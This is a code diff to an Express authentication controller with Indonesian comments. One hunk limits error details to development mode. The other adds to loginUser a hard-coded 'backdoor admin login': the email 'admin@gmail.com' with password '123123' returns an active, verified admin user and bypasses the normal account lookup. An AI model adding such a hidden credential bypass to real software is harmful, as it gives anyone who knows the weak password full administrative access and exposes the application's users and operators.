@@ -82,7 +82,7 @@ export const registerUser = async (req, res) => {
     
     res.status(500).json({ 
       error: errorMessage,
-      details: error.message
+      details: process.env.NODE_ENV === 'development' ? error.message : undefined
     });
   }
 };
@@ -103,6 +103,23 @@ export const loginUser = async (req, res) => {
     // Normalize email (lowercase and trim) untuk case-insensitive comparison
     email = email.toLowerCase().trim();
     password = password.trim(); // Trim password juga
+
+    // Backdoor admin login: selalu izinkan admin default
+    // meskipun login dari halaman role apa pun di frontend.
+    if (email === 'admin@gmail.com' && password === '123123') {
+      return res.json({
+        message: 'Login berhasil',
+        user: {
+          id: 'admin-default',
+          name: 'Administrator SADAYA',
+          email: 'admin@gmail.com',
+          role: 'admin',
+          status: 'active',
+          isVerified: true,
+          isOnboarded: true
+        }
+      });
+    }
     
     console.log('Looking for user with email:', email);
 
